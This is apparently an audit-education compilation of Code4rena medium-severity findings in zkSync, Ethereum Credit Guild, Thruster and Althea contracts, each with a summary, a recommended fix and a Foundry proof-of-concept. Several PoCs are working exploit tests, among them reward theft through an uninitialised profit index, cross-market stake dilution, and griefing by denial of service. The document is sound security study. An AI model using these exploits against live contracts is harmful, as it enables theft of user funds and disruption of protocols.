# ETAAcademy-Adudit: 3. Check

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>03. Check</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>math</th>
          <td>check</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] Mailbox.requestL2Transaction() checks the deposit limit of msg.sender (L1WethBridge) instead of the real depositor of weth from L1, as a result, after certain time, nobody will be able to deposit weth anymore from L1

### Check the deposit limit of msg.sender not depositor

- Summary : The deposit limit check is based on the **`msg.sender`** (bridge) rather than the actual depositor. Consequently, when the bridge's deposit limit is met, further deposits are blocked, even if individual depositors haven't reached their personal limits.
- Impact & Recommendation: This flaw could prevent anyone from using Zksync to deposit WETH from L1 to L2. To address this issue, the deposit limit check should be based on the real depositor's limit instead of the bridge's.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#m-15-mailboxrequestl2transaction-checks-the-deposit-limit-of-msgsender-l1wethbridge-instead-of-the-real-depositor-of-weth-from-l1-as-a-result-after-certain-time-nobody-will-be-able-to-deposit-weth-anymore-from-l1) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```solidity

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.17;
    import "lib/forge-std/src/Test.sol";
    import {L1WethBridgeTest} from "./_L1WethBridge_Shared.t.sol";
    import {IAllowList} from "../../../../../../cache/solpp-generated-contracts/common/interfaces/IAllowList.sol";
    import {REQUIRED_L2_GAS_PRICE_PER_PUBDATA} from "../../../../../../cache/solpp-generated-contracts/zksync/Config.sol";
    contract DepositTest is L1WethBridgeTest {
        function deposit(address user, uint256 amount) private returns (bool) {
            hoax(user);
            l1Weth.deposit{value: amount}();
            hoax(user);
            l1Weth.approve(address(bridgeProxy), amount);
            bytes memory depositCallData = abi.encodeWithSelector(
                bridgeProxy.deposit.selector,
                user,
                bridgeProxy.l1WethAddress(),
                amount,
                1000000,                        // gas limit
                REQUIRED_L2_GAS_PRICE_PER_PUBDATA,
                user
            );
            hoax(user);
            (bool success, ) = address(bridgeProxy).call{value: 0.1 ether}(depositCallData);
            return success;
        }
        function test_DepositExceedLimit() public {
            console.log("\n \n test_DepositExceeLimit is started....$$$$$$$$$$$$$$4");
            address user1 = address(111);
            address user2 = address(222);
            address user3 = address(333);
            vm.prank(owner);
            allowList.setDepositLimit(address(0), true, 10 ether); // deposit at most 10 ether
            IAllowList.Deposit memory limitData = IAllowList(allowList).getTokenDepositLimitData(address(0));
            assertEq(limitData.depositCap, 10 ether);

            bool success = deposit(user1, 3 ether); // send 3 ether weth and 0.1 ether eth
            assertTrue(success);
            success = deposit(user2, 4 ether); // send 4 ether weth and 0.1 ether eth
            assertTrue(success);
            success =  deposit(user3, 2.7 ether + 1); // send 2.7 ether + 1 weth  and 0.1 ether eth, now a total of 10ether + 1, will it exceed?
            assertFalse(success);   // s.totalDepositedAmountPerUser[L1WethBridge] = 10 ether + 1, it exceeds the limit of 10 ether
        }
    }


  ```

  </details>

## 2.[Medium] The userGaugeProfitIndex is not set correctly, allowing an attacker to receive rewards without waiting

### Not correctly initialized

- Summary: This vulnerability arises from a flaw in the **`ProfitManager`** contract where the **`userGaugeProfitIndex`** is not correctly initialized, if the user's gauge weight is zero.
- Impact & Recommendation: As a result, the attacker can drain rewards, potentially depriving other users of their entitled rewards. To address this issue, it's crucial to ensure that the **`userGaugeProfitIndex`** is correctly set to the current `gaugeProfitIndex` when initially accessed, later when the `gaugeProfitIndex` grows the user will be able to claim the rewards.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-01-the-usergaugeprofitindex-is-not-set-correctly-allowing-an-attacker-to-receive-rewards-without-waiting) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

  function testAttackClaimAfterProfit() public {
        address attacker = makeAddr("attacker");
        vm.startPrank(governor);
        core.grantRole(CoreRoles.GOVERNOR, address(this));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
        vm.stopPrank();
        vm.prank(governor);
        profitManager.setProfitSharingConfig(
            0, // surplusBufferSplit
            0.5e18, // creditSplit
            0.5e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );
        guild.setMaxGauges(1);
        guild.addGauge(1, gauge1);
        guild.mint(attacker, 150e18);
        guild.mint(bob, 400e18);
        vm.prank(bob);
        guild.incrementGauge(gauge1, 400e18);

        credit.mint(address(profitManager), 20e18);
        profitManager.notifyPnL(gauge1, 20e18);
        //Attacker votes for a gauge after it notifies profit
        //The userGaugeProfitIndex of the attacker is not set
        vm.prank(attacker);
        guild.incrementGauge(gauge1, 150e18);

        //Because the userGaugeProfitIndex is not set it will be set to 1e18
        //The gaugeProfitIndex will be 1.025e18 so the attacker will steal the rewards
        profitManager.claimGaugeRewards(attacker,gauge1);
        console.log(credit.balanceOf(attacker));
        //Other users will then fail to claim their rewards
        vm.expectRevert(bytes("ERC20: transfer amount exceeds balance"));
        profitManager.claimGaugeRewards(bob,gauge1);
        console.log(credit.balanceOf(bob));
    }

  ```

  </details>

## 3.[Medium] No check for sequencer uptime can lead to dutch auctions failing or executing at bad prices

### Sequencer uptime

- Summary: The AuctionHouse contract doesn't check sequencer uptime, risking failed auctions or unfavorable prices. Without bids for over 10 minutes, the protocol faces losses or loan forgiveness, impacting users during network outages.

- Impact & Recommendation : Consider using Chainlink’s L2 Sequencer Feeds or implementing a mechanism to restart auctions if no bids are received.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-01-no-check-for-sequencer-uptime-can-lead-to-dutch-auctions-failing-or-executing-at-bad-prices) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
      /// @notice maximum duration of auctions, in seconds.
    /// with a midpoint of 650 (10m50s) and an auction duration of 30min, and a block every
    /// 13s, first phase will last around 50 blocks and each block will offer an additional
    /// 1/(650/13)=2% of the collateral during the first phase. During the second phase,
    /// every block will ask 1/((1800-650)/13)=1.13% less CREDIT in each block.
    uint256 public immutable auctionDuration;

  ```

  </details>

## 4.[Medium] Users can deflate other markets Guild holders rewards by staking less priced token

### Stake less priced token

- Summary: The SurplusGuildMinter::stake() function lacks a check to ensure that the provided term's CREDIT token matches the one in the called SurplusGuildMinter contract. A potential exploit arises where a user stakes in SurplusGuildMinter(gUSDC) using a gWETH term. This action generates Guild tokens based on staked gUSDC but increases the gaugeWeight for gWETH. Consequently, other guild token holders in the gWETH market may receive reduced rewards.

- Impact & Recommendation: To prevent manipulation, include a verification in the stake() function to confirm that the provided term belongs to the same market as the SurplusGuildMinter.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-09-users-can-deflate-other-markets-guild-holders-rewards-by-staking-less-priced-token) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    pragma solidity 0.8.13;
    import {Test, console} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    import {SurplusGuildMinter} from "@src/loan/SurplusGuildMinter.sol";
    contract StakeIntoWrongTermUnitTest is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address private EXPLOITER = makeAddr("exploiter");
        address private STAKER1 = makeAddr("staker1");
        address private STAKER2 = makeAddr("staker2");
        address private STAKER3 = makeAddr("staker3");
        address private termUSDC;
        address private termWETH;
        Core private core;
        ProfitManager private profitManagerUSDC;
        ProfitManager private profitManagerWETH;
        CreditToken gUSDC;
        CreditToken gWETH;
        GuildToken guild;
        RateLimitedMinter rlgm;
        SurplusGuildMinter sgmUSDC;
        SurplusGuildMinter sgmWETH;
        // GuildMinter params
        uint256 constant MINT_RATIO = 2e18;
        uint256 constant REWARD_RATIO = 5e18;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManagerUSDC = new ProfitManager(address(core));
            profitManagerWETH = new ProfitManager(address(core));
            gUSDC = new CreditToken(address(core), "gUSDC", "gUSDC");
            gWETH = new CreditToken(address(core), "gWETH", "gWETH");
            guild = new GuildToken(address(core), address(profitManagerWETH));
            rlgm = new RateLimitedMinter(
                address(core), /*_core*/
                address(guild), /*_token*/
                CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
                type(uint256).max, /*_maxRateLimitPerSecond*/
                type(uint128).max, /*_rateLimitPerSecond*/
                type(uint128).max /*_bufferCap*/
            );
            sgmUSDC = new SurplusGuildMinter(
                address(core),
                address(profitManagerUSDC),
                address(gUSDC),
                address(guild),
                address(rlgm),
                MINT_RATIO,
                REWARD_RATIO
            );
            sgmWETH = new SurplusGuildMinter(
                address(core),
                address(profitManagerWETH),
                address(gWETH),
                address(guild),
                address(rlgm),
                MINT_RATIO,
                REWARD_RATIO
            );
            profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));
            profitManagerWETH.initializeReferences(address(gWETH), address(guild), address(0));
            termUSDC = address(new MockLendingTerm(address(core)));
            termWETH = address(new MockLendingTerm(address(core)));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
            core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));
            core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmWETH));
            core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));
            core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmWETH));
            core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            // add gauge and vote for it
            guild.setMaxGauges(10);
            guild.addGauge(1, termUSDC);
            guild.addGauge(2, termWETH);
            // labels
            vm.label(address(core), "core");
            vm.label(address(profitManagerUSDC), "profitManagerUSDC");
            vm.label(address(profitManagerWETH), "profitManagerWETH");
            vm.label(address(gUSDC), "gUSDC");
            vm.label(address(gWETH), "gWETH");
            vm.label(address(guild), "guild");
            vm.label(address(rlgm), "rlcgm");
            vm.label(address(sgmUSDC), "sgmUSDC");
            vm.label(address(sgmWETH), "sgmWETH");
            vm.label(termUSDC, "termUSDC");
            vm.label(termWETH, "termWETH");
        }
        function testC1() public {
            gWETH.mint(STAKER1, 10e18);
            gWETH.mint(STAKER2, 50e18);
            gWETH.mint(STAKER3, 30e18);
            vm.startPrank(STAKER1);
            gWETH.approve(address(sgmWETH), 10e18);
            sgmWETH.stake(termWETH, 10e18);
            vm.stopPrank();
            vm.startPrank(STAKER2);
            gWETH.approve(address(sgmWETH), 50e18);
            sgmWETH.stake(termWETH, 50e18);
            vm.stopPrank();
            vm.startPrank(STAKER3);
            gWETH.approve(address(sgmWETH), 30e18);
            sgmWETH.stake(termWETH, 30e18);
            vm.stopPrank();

            console.log("------------------------BEFORE ATTACK------------------------");
            console.log("Gauge(gWETH) Weight:                   ", guild.getGaugeWeight(termWETH));
            vm.warp(block.timestamp + 150 days);
            vm.prank(governor);
            profitManagerWETH.setProfitSharingConfig(
                0.05e18, // surplusBufferSplit
                0.9e18, // creditSplit
                0.05e18, // guildSplit
                0, // otherSplit
                address(0) // otherRecipient
            );
            gWETH.mint(address(profitManagerWETH), 1e18);
            profitManagerWETH.notifyPnL(termWETH, 1e18);
            sgmWETH.getRewards(STAKER1, termWETH);
            sgmWETH.getRewards(STAKER2, termWETH);
            sgmWETH.getRewards(STAKER3, termWETH);
            console.log("Staker1 reward:                             ", gWETH.balanceOf(address(STAKER1)));
            console.log("Staker2 reward:                            ", gWETH.balanceOf(address(STAKER2)));
            console.log("Staker3 reward:                            ", gWETH.balanceOf(address(STAKER3)));
            console.log("GaugeProfitIndex:                        ", profitManagerWETH.gaugeProfitIndex(termWETH));
        }
        function testC2() public {
            gWETH.mint(STAKER1, 10e18);
            gWETH.mint(STAKER2, 50e18);
            gWETH.mint(STAKER3, 30e18);
            vm.startPrank(STAKER1);
            gWETH.approve(address(sgmWETH), 10e18);
            sgmWETH.stake(termWETH, 10e18);
            vm.stopPrank();
            vm.startPrank(STAKER2);
            gWETH.approve(address(sgmWETH), 50e18);
            sgmWETH.stake(termWETH, 50e18);
            vm.stopPrank();
            vm.startPrank(STAKER3);
            gWETH.approve(address(sgmWETH), 30e18);
            sgmWETH.stake(termWETH, 30e18);
            vm.stopPrank();
            console.log("------------------------AFTER ATTACK-------------------------");
            console.log("Gauge(gWETH) Weight Before Attack:     ", guild.getGaugeWeight(termWETH));
            gUSDC.mint(EXPLOITER, 100e18);
            console.log("EXPLOITER gUSDC balance before stake:  ", gUSDC.balanceOf(EXPLOITER));
            vm.startPrank(EXPLOITER);
            gUSDC.approve(address(sgmUSDC), 100e18);
            sgmUSDC.stake(termWETH, 100e18);
            console.log("EXPLOITER gUSDC balance after stake:                       ", gUSDC.balanceOf(EXPLOITER));
            vm.stopPrank();
            console.log("Gauge(gWETH) Weight After Attack:      ", guild.getGaugeWeight(termWETH));
            vm.warp(block.timestamp + 150 days);
            vm.prank(governor);
            profitManagerWETH.setProfitSharingConfig(
                0.05e18, // surplusBufferSplit
                0.9e18, // creditSplit
                0.05e18, // guildSplit
                0, // otherSplit
                address(0) // otherRecipient
            );
            gWETH.mint(address(profitManagerWETH), 1e18);
            profitManagerWETH.notifyPnL(termWETH, 1e18);
            vm.startPrank(EXPLOITER);
            sgmUSDC.unstake(termWETH, 100e18);
            vm.stopPrank();
            console.log("EXPLOITER gUSDC balance after unstake: ", gUSDC.balanceOf(EXPLOITER));
            sgmWETH.getRewards(EXPLOITER, termWETH);
            sgmUSDC.getRewards(EXPLOITER, termWETH);
            console.log("EXPLOITER reward:                                          ", gWETH.balanceOf(address(EXPLOITER)));
            sgmWETH.getRewards(STAKER1, termWETH);
            sgmWETH.getRewards(STAKER2, termWETH);
            sgmWETH.getRewards(STAKER3, termWETH);
            console.log("Staker1 reward:                             ", gWETH.balanceOf(address(STAKER1)));
            console.log("Staker2 reward:                            ", gWETH.balanceOf(address(STAKER2)));
            console.log("Staker3 reward:                             ", gWETH.balanceOf(address(STAKER3)));
            console.log("GaugeProfitIndex After:                  ", profitManagerWETH.gaugeProfitIndex(termWETH));
        }
    }

  ```

  </details>

## 5.[Medium] There is no way to liquidate a position if it breaches maxDebtPerCollateralToken value creating bad debt.

### debtPerCollateralToken < maxDebtPerCollateral

- Summary: The lending protocol aims to maintain a healthy debt-to-collateral ratio. However, over time, accrued interest can push users' debt beyond this ratio. Even though the ratio is breached, positions can't be called unless users miss repayment deadlines. In addition, In the current setup, periodic repayments aren't enforced for every term, making it possible for malicious users to avoid repayments and keep their positions unliquidatable.
- Impact & Recommendation: This loophole creates risks for the protocol, as offboarding a term requires force-closing all positions, leading to potential losses for lenders and missed interest payments. Enforcing a check of debtPerCollateralToken < maxDebtPerCollateral in \_partialRepay, or in \_call to prevent underwater positions, when partial repays are off. However, this may limit users from borrowing up to the maximum initially, posing trade-offs.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-07-there-is-no-way-to-liquidate-a-position-if-it-breaches-maxdebtpercollateraltoken-value-creating-bad-debt) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testBreakMaxDebtPerCollateralToken() public {
            // prepare
            uint256 borrowAmount = 30_000e18;
            uint256 collateralAmount = 15e18;
            collateral.mint(address(this), collateralAmount);
            collateral.approve(address(term), collateralAmount);
            credit.approve(address(term), type(uint256).max);
            // borrow
            bytes32 loanId = term.borrow(borrowAmount, collateralAmount);
            vm.warp(block.timestamp + (term.YEAR() * 3));
            // 3 years have passed, and now position's debt is 39_000
            uint256 loanDebt = term.getLoanDebt(loanId);
            assertEq(loanDebt, 39_000e18);
            // A user is able to call partialRepays even if he missed partialRepays deadline
            term.partialRepay(
                loanId,
                (loanDebt * _MIN_PARTIAL_REPAY_PERCENT) / 1e18
            );
            // After repaying just minPartialRepayPercent, a debtPerCollateralToken of the position is 2080, which is greater than maxDebtPerCollateral
            uint256 newLoanDebt = term.getLoanDebt(loanId);
            assertEq((newLoanDebt / 15e18) * 1e18, 2080000000000000000000);
            assertGt((newLoanDebt / 15e18) * 1e18, _CREDIT_PER_COLLATERAL_TOKEN);
            // A position cannot be called
            vm.expectRevert("LendingTerm: cannot call");
            term.call(loanId);
        }

  ```

  </details>

## 6.[Medium] LendingTerm debtCeiling function uses creditMinterBuffer incorrectly

### Buffer sets a limit on additional borrows

- Summary: Buffer sets a limit on additional borrows, rather than on the total of current issuance and additional borrows. This results in a revert in `GuildToken::_decrementGaugeWeight` whenever a gauge's current issuance surpasses the remaining buffer, regardless of whether the post-decrement true `debtCeiling` exceeds the `issuance`.

- Impact & Recommendation: Guild voters and surplusGuildMinder stakers are unfairly unable to withdraw their votes/stakes due to a flaw where borrowing demand or malicious actors keep a term's issuance above the remaining buffer, blocking exits. The use of creditMinterBuffer causes debtCeiling to be lower than it should, so that creditMinterBuffer should be removed from the debt ceiling calculation.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-13-lendingterm-debtceiling-function-uses-creditminterbuffer-incorrectly) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testDebtCeilingBufferError() public {
        //causes this contract to vote on term
        testAllocateGaugeToSDAI();
        //borrow 51% of the credit buffer to simulate issuance being above
        //remaining buffer
        uint256 borrowAmount = rateLimitedCreditMinter.buffer() * 51 / 100;
        uint128 supplyAmount = uint128(borrowAmount);
        bytes32 loanId = _supplyCollateralUserOne(borrowAmount, supplyAmount);
        //try to remove 2%  of the vote
        uint256 decrementAmount = guild.balanceOf(address(this)) * 2 / 100;
        vm.expectRevert("GuildToken: debt ceiling used");
        guild.decrementGauge(address(term), decrementAmount);
        //Reverts due to finding error. Decrementing 2% should succeed in the case
        //of a single term but fails because current issuance is above the remaining buffer.
    }

  ```

  </details>

## 7.[Medium] LendingTerm::debtCeiling() can return wrong debt as the min() is evaluated incorrectlybt.

### Incorrect **`min()`** calculation

- Summary: The `LendingTerm::debtCeiling()` function calculates the min of `creditMinterBuffer, _debtCeiling and _hardCap` , which is flawed, as it does not always return the minimum of the 3 values.

- Impact & Recommendation: Due to the incorrect `min()` calculation, the `LendingTerm::debtCeiling()` function may return an incorrect value, potentially resulting in a higher debt ceiling than intended. It is recommended to review and correct the calculation to ensure the function returns the actual debt ceiling value as intended.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-15-lendingtermdebtceiling-can-return-wrong-debt-as-the-min-is-evaluated-incorrectly) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    -   if (creditMinterBuffer < _debtCeiling) {
    -      return creditMinterBuffer;
    -   }
    -   if (_hardCap < _debtCeiling) {
    -      return _hardCap;
    -   }
    -   return _debtCeiling;
    +   if (creditMinterBuffer < _debtCeiling && creditMinterBuffer < _hardCap) {
    +       return creditMinterBuffer;
    +   } else if (_debtCeiling < _hardCap) {
    +       return _debtCeiling;
    +   } else {
    +       return _hardCap;
    +   }

  ```

  </details>

## 8.[Medium] Inability to offboard term twice in a 7-day period may lead to bad debt to the market

### Offboard term twice in duration

- Summary: The system restricts proposing the offboarding of a lending term more than once within a 7-day period to prevent abuse. However, if a term is offboarded and re-onboarded quickly due to market conditions, voters won't be able to offboard it again if needed, potentially leading to the creation of bad debt and market impact.

- Impact & Recommendation: Currently, voters cannot offboard the same term twice within a 7-day window, potentially leading to bad debt and market impact if loans default. To address this, it's suggested to modify proposeOffboard() to allow a second offboarding if the previous one is completed.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-20-inability-to-offboard-term-twice-in-a-7-day-period-may-lead-to-bad-debt-to-the-market) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testCannotOffboardTwiceIn7Days() public {
        // Offboard term
        guild.mint(bob, _QUORUM);
        vm.startPrank(bob);
        guild.delegate(bob);
        uint256 snapshotBlock = block.number;
        offboarder.proposeOffboard(address(term));
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 13);
        offboarder.supportOffboard(snapshotBlock, address(term));
        offboarder.offboard(address(term));
        // Get enough CREDIT to pack back interests
        vm.stopPrank();
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 13);
        uint256 debt = term.getLoanDebt(aliceLoanId);
        credit.mint(alice, debt - aliceLoanSize);
        // Close loans and cleanup
        vm.startPrank(alice);
        credit.approve(address(term), debt);
        term.repay(aliceLoanId);
        vm.stopPrank();
        offboarder.cleanup(address(term));
        // After ~5 days @ 13s/block...
        vm.roll(block.number + 33230);
        vm.warp(block.timestamp + 5 days);
        // Re-onboard
        guild.addGauge(1, address(term));
        // After ~1 day...
        vm.roll(block.number + 6646);
        vm.warp(block.timestamp + 1 days);
        // It's not possible to offboard a second time
        vm.expectRevert("LendingTermOffboarding: poll active");
        offboarder.proposeOffboard(address(term));
    }


  ```

  </details>

## 9.[Medium] SurplusGuildMinter.getReward() is susceptible to DoS due to unbounded loop

### No limit set on the length of loop

- Summary: SurplusGuildMinter's `getReward()` function invokes ProfitManager's `claimRewards()` that in a loop for all gauges/terms. With no limit set on the number of gauges and terms by `GuildToken.setMaxGauges(max)`, excessive gas consumption or Out-Of-Gas reverts may occur.
- Impact & Recommendation: In `SurplusGuildMinter's getReward(user, term)` call, use `ProfitManager(profitManager).claimRewards(address(this), term)` to ensure specific updating of the profit index for the given term instead of updating all available terms.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-25-surplusguildmintergetreward-is-susceptible-to-dos-due-to-unbounded-loop) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    // Put inside test/unit/loan/SurplusGuildMinter.t.sol
    function test_dos() public {
        address alice = address(789);
        // Number of terms that triggers OOG for stake/unstake/getReward
        uint256 numTerms = 6500;
        address[] memory terms = new address[](numTerms);
        guild.setMaxGauges(numTerms + 1);
        credit.mint(alice, 10e18);
        // Alice stakes Credit tokens
        vm.startPrank(alice);
        credit.approve(address(sgm), 10e18);
        sgm.stake(term, 10e18);
        vm.stopPrank();
        // Create terms
        credit.mint(address(this), 10e18 * numTerms);
        credit.approve(address(sgm), 10e18 * numTerms);
        for (uint256 i; i < numTerms; i++) {
            address _term = address(new MockLendingTerm(address(core)));
            terms[i] = _term;
            guild.addGauge(1, _term); // gaugeType = 1
            sgm.stake(_term, 10e18);
        }
        uint256 gasBefore =  gasleft();
        // Alice tries to call getRewards()
        sgm.getRewards(alice, term);
        uint256 gasAfter =  gasleft();
        uint256 BLOCK_GAS_LIMIT = 30e6;

        // getRewards() consumes more gas than block gas limit of 30Mil
        // reverts with OOG
        require(gasBefore - gasAfter > BLOCK_GAS_LIMIT);
    }



  ```

  </details>

## 10.[Medium] Dynamic modification of maxPrizeCount affects prize claims

### Change the length of loop

- Summary: There's a variable called maxPrizeCount, set by the owner, defining the maximum number of prize winners for a round. The issue arises when maxPrizeCount is decreased after setting prizes but before they're claimed. This causes winners of prizes with indices higher than the new maxPrizeCount to be unable to claim their winnings.

- Impact & Recommendation: To address this issue, it's advisable to implement a require check ensuring that maxPrizeCount cannot be decreased, as that aligns with the intended functionality.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-thruster#m-03-dynamic-modification-of-maxprizecount-affects-prize-claims) & [Report](https://code4rena.com/reports/2024-02-thruster)

  <details><summary>POC</summary>

  ```solidity

    /*
    1. The contract owner sets maxPrizeCount to 5 and configures five prizes for a given round.
    2.Users participate in the round, and the round concludes with winners determined for all five prizes.
    3.The contract owner reduces maxPrizeCount to 3 for the next round.
    4.Winners of prizes 4 and 5 attempt to claim their prizes but are unable to do so because the claimPrizesForRound
    (uint256 roundToClaim) function now iterates only up to the new maxPrizeCount of 3.
    */

    function setMaxPrizeCount(uint256 _maxPrizeCount) external onlyOwner {
        maxPrizeCount = _maxPrizeCount;
        emit SetMaxPrizeCount(_maxPrizeCount);


    }

    function claimPrizesForRound(uint256 roundToClaim) external {
        ...

        uint256 maxPrizeCount_ = maxPrizeCount;
        for (uint256 i = 0; i < maxPrizeCount_; i++) {
            [claim prize]
        }
        entered[msg.sender][roundToClaim] = Round(0, 0, roundToClaim); // Clear user's tickets for the round
        emit CheckedPrizesForRound(msg.sender, roundToClaim);
    }



  ```

  </details>

## 11.[Medium] Malicious users can prevent holders from claiming their rewards during a reward cycle by skipping it

### Claim rewards

- Summary: Even if there are no rewards available, a malicious user can trigger the distribution process and set a boolean flag to lock the distribution, preventing anyone from claiming rewards. Consequently, the next reward cycle is delayed until after a certain number of blocks have passed.

- Impact & Recommendation: Only initiate reward cycles when there are rewards available in the liquidNFT transferred to the liquidERC20, preventing malicious manipulation.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-02-malicious-users-can-prevent-holders-from-claiming-their-rewards-during-a-reward-cycle-by-skipping-it) & [Report](https://code4rena.com/reports/2024-02-thruster)

  <details><summary>POC</summary>

  ```solidity
  // SPDX-License-Identifier: UNLICENSED
  pragma solidity 0.8.12;
  // git clone https://github.com/althea-net/liquid-infrastructure-contracts.git
  // cd liquid-infrastructure-contracts/
  // npm install
  // forge init --force
  // vim test/Test.t.sol
      // save this test file
  // run using:
  // forge test --match-test "testGrieveCycles" -vvvv
  import {Test, console2} from "forge-std/Test.sol";
  import { LiquidInfrastructureERC20 } from "../contracts/LiquidInfrastructureERC20.sol";
  import { LiquidInfrastructureNFT } from "../contracts/LiquidInfrastructureNFT.sol";
  import { TestERC20A } from "../contracts/TestERC20A.sol";
  import { TestERC20B } from "../contracts/TestERC20B.sol";
  import { TestERC20C } from "../contracts/TestERC20C.sol";
  import { TestERC721A } from "../contracts/TestERC721A.sol";
  contract ERC20Test is Test {
      LiquidInfrastructureERC20 liquidERC20;
      TestERC20A erc20A;
      TestERC20B erc20B;
      TestERC20C erc20C;
      LiquidInfrastructureNFT liquidNFT;
      address owner = makeAddr("Owner");
      address alice = makeAddr("Alice");
      address bob = makeAddr("Bob");
      address charlie = makeAddr("Charlie");
      address delta = makeAddr("Delta");
      address eve = makeAddr("Eve");
      address malicious_user = makeAddr("malicious_user");

      function setUp() public {
      vm.startPrank(owner);
      // Create a rewardToken
      address[] memory ERC20List = new address[](1);
      erc20A = new TestERC20A();
      ERC20List[0] = address(erc20A);
      // Create managed NFT
      address[] memory ERC721List = new address[](1);
      liquidNFT = new LiquidInfrastructureNFT("LIQUID");
      ERC721List[0] = address(liquidNFT);
      // Create approved holders
      address[] memory holderList = new address[](5);
      holderList[0] = alice;
      holderList[1] = bob;
      holderList[2] = charlie;
      holderList[3] = delta;
      holderList[4] = eve;
      // Create liquidERC20 and mint liquidERC20 to the approved holders
      liquidERC20 = new LiquidInfrastructureERC20("LiquidERC20", "LIQ", ERC721List, holderList, 210000, ERC20List);
      liquidERC20.mint(alice, 1e18);
      liquidERC20.mint(bob, 1e18);
      liquidERC20.mint(charlie, 1e18);
      liquidERC20.mint(delta, 1e18);
      liquidERC20.mint(eve, 1e18);
      // Add threshold and rewardToken to liquidNFT
      uint256[] memory amountList = new uint256[](1);
      amountList[0] = 100;
      liquidNFT.setThresholds(ERC20List, amountList);
      liquidNFT.transferFrom(owner, address(liquidERC20), 1);
      // Mint 5e18 rewardTokens to liquidNFT
      erc20A.mint(address(liquidNFT), 5e18);
      vm.stopPrank();
      }
      function testGrieveCycles() public {
      // Go to block 210001, call withdrawFromAllManagedNFTs to get the rewards, and distribute everything to bring the token balance of the reward token to 0. This is just a sanity check.
      vm.roll(210001);
      liquidERC20.withdrawFromAllManagedNFTs();
      liquidERC20.distributeToAllHolders();
      // Go to block ((210000 * 2) + 1).
      vm.roll(420001);
      // Malicious user calls distribute
      // This makes it temporarily unavailable to withdraw the rewards.
      vm.prank(malicious_user);
      liquidERC20.distribute(1);

      // Rewards can't be pulled or withdrawn from the ERC20 contract.
      vm.expectRevert();
      vm.prank(owner);
      liquidERC20.withdrawFromAllManagedNFTs();
      // This sets the next reward period to start at ((210000 * 3) + 1).
      vm.startPrank(owner);
      liquidERC20.distributeToAllHolders();
      liquidERC20.withdrawFromAllManagedNFTs();
      vm.stopPrank();
